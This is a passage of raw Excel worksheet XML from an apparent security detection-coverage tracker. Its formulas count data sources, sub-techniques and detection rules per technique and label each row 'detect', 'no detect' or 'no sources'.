        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O122" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P122" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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22" t="s">
        <v>386</v>
      </c>
      <c r="U122" t="s">
        <v>869</v>
      </c>
      <c r="W122" t="b">
        <v>1</v>
      </c>
      <c r="X122" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="123" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A123" t="s">
        <v>829</v>
      </c>
      <c r="B123" t="s">
        <v>870</v>
      </c>
      <c r="C123" t="s">
        <v>871</v>
      </c>
      <c r="D123" t="s">
        <v>3</v>
      </c>
      <c r="E123" t="s">
        <v>872</v>
      </c>
      <c r="F123" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G123" s="9" cm="1">
        <f t="array" ref="G123">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H123" s="9" t="str" cm="1">
        <f t="array" ref="H123">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I123" s="9" t="str" cm="1">
        <f t="array" ref="I123">IF(SUM(IF($C123=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C123=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J123" s="9" t="str" cm="1">
        <f t="array" ref="J12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23" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M123" s="9" cm="1">
        <f t="array" ref="M123">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N123" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O123" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P123" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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23" t="s">
        <v>425</v>
      </c>
      <c r="U123" t="s">
        <v>873</v>
      </c>
      <c r="W123" t="b">
        <v>1</v>
      </c>
      <c r="X123" t="s">
        <v>829</v>
      </c>
    </row>
    <row r="124" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A124" t="s">
        <v>874</v>
      </c>
      <c r="B124" t="s">
        <v>874</v>
      </c>
      <c r="C124" t="s">
        <v>128</v>
      </c>
      <c r="D124" t="s">
        <v>5</v>
      </c>
      <c r="E124" t="s">
        <v>875</v>
      </c>
      <c r="F124" s="9">
        <f t="shared" si="1"/>
        <v>2</v>
      </c>
      <c r="G124" s="9" cm="1">
        <f t="array" ref="G124">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H124" s="9" cm="1">
        <f t="array" ref="H124">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I124" s="9" t="str" cm="1">
        <f t="array" ref="I124">IF(SUM(IF($C124=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C124=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J124" s="9" t="str" cm="1">
        <f t="array" ref="J12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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M124" s="9" cm="1">
        <f t="array" ref="M124">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N124" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O124" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P124" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S12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24" t="s">
        <v>598</v>
      </c>
      <c r="U124" t="s">
        <v>876</v>
      </c>
      <c r="V124" t="s">
        <v>877</v>
      </c>
      <c r="W124" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="125" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A125" t="s">
        <v>878</v>
      </c>
      <c r="B125" t="s">
        <v>878</v>
      </c>
      <c r="C125" t="s">
        <v>186</v>
      </c>
      <c r="D125" t="s">
        <v>8</v>
      </c>
      <c r="E125" t="s">
        <v>879</v>
      </c>
      <c r="F125" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G125" s="9" cm="1">
        <f t="array" ref="G125">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H125" s="9" cm="1">
        <f t="array" ref="H125">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I125" s="9" t="str" cm="1">
        <f t="array" ref="I125">IF(SUM(IF($C125=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C125=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J125" s="9" cm="1">
        <f t="array" ref="J12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125" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M125" s="9" cm="1">
        <f t="array" ref="M125">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N125" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O125" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P125" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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25" t="s">
        <v>643</v>
      </c>
      <c r="U125" t="s">
        <v>880</v>
      </c>
      <c r="V125" t="s">
        <v>881</v>
      </c>
      <c r="W125" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="126" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A126" t="s">
        <v>878</v>
      </c>
      <c r="B126" t="s">
        <v>882</v>
      </c>
      <c r="C126" t="s">
        <v>267</v>
      </c>
      <c r="D126" t="s">
        <v>8</v>
      </c>
      <c r="E126" t="s">
        <v>883</v>
      </c>
      <c r="F126" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G126" s="9" cm="1">
        <f t="array" ref="G126">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H126" s="9" t="str" cm="1">
        <f t="array" ref="H126">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I126" s="9" t="str" cm="1">
        <f t="array" ref="I126">IF(SUM(IF($C126=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C126=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J126" s="9" t="str" cm="1">
        <f t="array" ref="J12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26" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M126" s="9" cm="1">
        <f t="array" ref="M126">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N126" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O126" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P126" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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26" t="s">
        <v>368</v>
      </c>
      <c r="U126" t="s">
        <v>884</v>
      </c>
      <c r="V126" t="s">
        <v>885</v>
      </c>
      <c r="W126" t="b">
        <v>1</v>
      </c>
      <c r="X126" t="s">
        <v>878</v>
      </c>
    </row>
    <row r="127" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A127" t="s">
        <v>878</v>
      </c>
      <c r="B127" t="s">
        <v>886</v>
      </c>
      <c r="C127" t="s">
        <v>320</v>
      </c>
      <c r="D127" t="s">
        <v>8</v>
      </c>
      <c r="E127" t="s">
        <v>883</v>
      </c>
      <c r="F127" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G127" s="9" cm="1">
        <f t="array" ref="G127">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H127" s="9" t="str" cm="1">
        <f t="array" ref="H127">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I127" s="9" t="str" cm="1">
        <f t="array" ref="I127">IF(SUM(IF($C127=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C127=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J127" s="9" t="str" cm="1">
        <f t="array" ref="J12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27" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M127" s="9" cm="1">
        <f t="array" ref="M127">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N127" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O127" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P127" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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27" t="s">
        <v>368</v>
      </c>
      <c r="U127" t="s">
        <v>887</v>
      </c>
      <c r="V127" t="s">
        <v>885</v>
      </c>
      <c r="W127" t="b">
        <v>1</v>
      </c>
      <c r="X127" t="s">
        <v>878</v>
      </c>
    </row>
    <row r="128" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A128" t="s">
        <v>878</v>
      </c>
      <c r="B128" t="s">
        <v>888</v>
      </c>
      <c r="C128" t="s">
        <v>257</v>
      </c>
      <c r="D128" t="s">
        <v>8</v>
      </c>
      <c r="E128" t="s">
        <v>879</v>
      </c>
      <c r="F128" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G128" s="9" cm="1">
        <f t="array" ref="G128">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H128" s="9" t="str" cm="1">
        <f t="array" ref="H128">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I128" s="9" t="str" cm="1">
        <f t="array" ref="I128">IF(SUM(IF($C128=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C128=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J128" s="9" t="str" cm="1">
        <f t="array" ref="J12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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M128" s="9" cm="1">
        <f t="array" ref="M128">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N128" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O128" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P128" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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28" t="s">
        <v>517</v>
      </c>
      <c r="U128" t="s">
        <v>889</v>
      </c>
      <c r="V128" t="s">
        <v>890</v>
      </c>
      <c r="W128" t="b">
        <v>1</v>
      </c>
      <c r="X128" t="s">
        <v>878</v>
      </c>
    </row>
    <row r="129" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A129" t="s">
        <v>891</v>
      </c>
      <c r="B129" t="s">
        <v>891</v>
      </c>
      <c r="C129" t="s">
        <v>176</v>
      </c>
      <c r="D129" t="s">
        <v>6</v>
      </c>
      <c r="E129" t="s">
        <v>892</v>
      </c>
      <c r="F129" s="9">
        <f t="shared" si="1"/>
        <v>14</v>
      </c>
      <c r="G129" s="9" cm="1">
        <f t="array" ref="G129">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H129" s="9" cm="1">
        <f t="array" ref="H129">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>10</v>
      </c>
      <c r="I129" s="9" t="str" cm="1">
        <f t="array" ref="I129">IF(SUM(IF($C129=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C129=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J129" s="9" cm="1">
        <f t="array" ref="J12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129" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>10</v>
      </c>
      <c r="M129" s="9" cm="1">
        <f t="array" ref="M129">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>10</v>
      </c>
      <c r="N129" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O129" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P129" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S12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29" t="s">
        <v>893</v>
      </c>
      <c r="U129" t="s">
        <v>894</v>
      </c>
      <c r="V129" t="s">
        <v>895</v>
      </c>
      <c r="W129" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="130" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A130" t="s">
        <v>891</v>
      </c>
      <c r="B130" t="s">
        <v>896</v>
      </c>
      <c r="C130" t="s">
        <v>280</v>
      </c>
      <c r="D130" t="s">
        <v>6</v>
      </c>
      <c r="E130" t="s">
        <v>897</v>
      </c>
      <c r="F130" s="9">
        <f t="shared" ref="F130:F193" si="2">LEN(E130)-LEN(SUBSTITUTE(E130,",",""))+1</f>
        <v>4</v>
      </c>
      <c r="G130" s="9" cm="1">
        <f t="array" ref="G130">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H130" s="9" t="str" cm="1">
        <f t="array" ref="H130">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I130" s="9" t="str" cm="1">
        <f t="array" ref="I130">IF(SUM(IF($C130=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C130=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J130" s="9" t="str" cm="1">
        <f t="array" ref="J13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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M130" s="9" cm="1">
        <f t="array" ref="M130">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N130" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O130" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P130" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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30" t="s">
        <v>386</v>
      </c>
      <c r="U130" t="s">
        <v>898</v>
      </c>
      <c r="V130" t="s">
        <v>899</v>
      </c>
      <c r="W130" t="b">
        <v>1</v>
      </c>
      <c r="X130" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="131" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A131" t="s">
        <v>891</v>
      </c>
      <c r="B131" t="s">
        <v>900</v>
      </c>
      <c r="C131" t="s">
        <v>310</v>
      </c>
      <c r="D131" t="s">
        <v>6</v>
      </c>
      <c r="E131" t="s">
        <v>901</v>
      </c>
      <c r="F131" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G131" s="9" cm="1">
        <f t="array" ref="G131">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H131" s="9" t="str" cm="1">
        <f t="array" ref="H131">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I131" s="9" t="str" cm="1">
        <f t="array" ref="I131">IF(SUM(IF($C131=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C131=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J131" s="9" t="str" cm="1">
        <f t="array" ref="J13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31" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M131" s="9" cm="1">
        <f t="array" ref="M131">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N131" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O131" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P131" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S13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31" t="s">
        <v>503</v>
      </c>
      <c r="U131" t="s">
        <v>902</v>
      </c>
      <c r="V131" t="s">
        <v>903</v>
      </c>
      <c r="W131" t="b">
        <v>1</v>
      </c>
      <c r="X131" t="s">
        <v>891</v>
      </c>
    </row>
    <row r="132" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A132" t="s">
        <v>891</v>
      </c>
      <c r="B132" t="s">
        <v>904</v>
      </c>
      <c r="C132" t="s">
        <v>905</v>
      </c>
